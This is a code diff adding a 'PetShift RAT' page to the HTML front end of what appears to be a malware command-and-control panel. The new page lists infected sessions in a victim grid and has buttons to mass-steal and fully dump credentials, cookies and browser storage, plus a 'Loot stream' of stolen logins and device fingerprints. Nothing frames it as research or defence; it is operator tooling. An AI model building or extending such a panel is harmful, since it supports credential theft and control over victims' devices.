@@ -26,6 +26,10 @@
     <span class="tip">DonutFlip</span>
   </button>
 
+  <button class="rail-btn" data-page="petshift" onclick="showPage('petshift')" title="PetShift RAT">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3c2 2 3 4 3 6a3 3 0 1 1-6 0c0-2 1-4 3-6Z"/><path d="M7 14c-1.5 1-2.5 2.2-2 3.6.5 1.4 2.2 1.7 3.4 1.2 1.6-.7 3.4-.7 5 0 1.2.5 2.9.2 3.4-1.2.5-1.4-.5-2.6-2-3.6"/><circle cx="8" cy="10" r="1.2"/><circle cx="12" cy="7.5" r="1.2"/><circle cx="16" cy="10" r="1.2"/></svg>
+    <span class="tip">PetShift</span>
+  </button>
   <button class="rail-btn" data-page="android" onclick="showPage('android')" title="Android">
     <svg viewBox="0 0 24 24"><rect x="7" y="2" width="10" height="20" rx="2"/><path d="M11 18h2M9 5h6"/></svg>
     <span class="tip">Android</span>
@@ -210,6 +214,68 @@
           <a class="cmd sm" id="donut-zip-link" href="#">Download all zip</a>
         </div>
         <div id="donut-loot" class="steal-summary">no loot yet</div>
+      </div>
+    </div>
+  </section>
+
+
+  <section class="page" id="page-petshift">
+    <div class="page-head">
+      <div>
+        <h2>PetShift RAT</h2>
+        <p class="sub" id="petshift-count">0 sessions</p>
+      </div>
+      <div class="top-actions">
+        <div class="search">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
+          <input id="petshift-search" placeholder="filter…" oninput="refreshPetshift()"/>
+        </div>
+        <button class="cmd sm" type="button" onclick="psMass('steal')">Mass steal</button>
+        <button class="cmd sm" type="button" onclick="psMass('full')">Mass full dump</button>
+        <button class="cmd sm" type="button" onclick="refreshPetshift()">Refresh</button>
+      </div>
+    </div>
+
+    <div class="victim-grid" id="petshift-list"></div>
+
+    <div id="ps-detail" class="hidden" style="margin-top:20px;display:none">
+      <div class="control-head" style="margin-bottom:12px">
+        <button class="back-btn" type="button" onclick="closePetshiftDetail()" title="back">
+          <svg viewBox="0 0 24 24" width="18" height="18"><path d="M15 18l-6-6 6-6" fill="none" stroke="currentColor" stroke-width="2"/></svg>
+        </button>
+        <div class="control-title">
+          <h2 id="ps-title">petshift</h2>
+          <p id="ps-subtitle">—</p>
+        </div>
+        <div class="stat-pills" id="ps-stats"></div>
+        <button class="cmd sm danger" type="button" id="ps-delete-btn">Remove</button>
+      </div>
+
+      <div class="card" style="padding:14px;border:1px solid var(--border);border-radius:12px;margin-bottom:12px">
+        <div style="font-weight:600;margin-bottom:8px">Stealer</div>
+        <div style="display:flex;flex-wrap:wrap;gap:8px">
+          <button class="cmd" type="button" data-ps-cmd="steal">Steal pack</button>
+          <button class="cmd" type="button" data-ps-cmd="cookies">Cookies + storage</button>
+          <button class="cmd" type="button" data-ps-cmd="credentials">Credentials</button>
+          <button class="cmd" type="button" data-ps-cmd="full">Full dump</button>
+          <button class="cmd" type="button" data-ps-cmd="ping">Ping</button>
+          <button class="cmd primary" type="button" data-ps-cmd="refresh">Refresh loot</button>
+        </div>
+      </div>
+
+      <div class="card" style="padding:14px;border:1px solid var(--border);border-radius:12px;margin-bottom:12px">
+        <div class="panel-title">Session</div>
+        <div id="ps-session-meta" class="panel-desc" style="white-space:pre-wrap;font-family:var(--mono);font-size:12px"></div>
+        <div style="margin-top:10px">
+          <textarea id="ps-notes" rows="3" placeholder="notes…" style="width:100%;background:var(--card2);border:1px solid var(--border);border-radius:10px;color:var(--text);padding:10px;font:inherit"></textarea>
+          <button class="cmd sm" type="button" style="margin-top:8px" onclick="savePetshiftNotes()">Save notes</button>
+        </div>
+      </div>
+
+      <div class="card" style="padding:14px;border:1px solid var(--border);border-radius:12px">
+        <div class="panel-title">Loot stream</div>
+        <div class="panel-desc">login dumps, cookies, storage, device fingerprints</div>
+        <div id="ps-loot" style="margin-top:12px;display:flex;flex-direction:column;gap:10px"></div>
       </div>
     </div>
   </section>
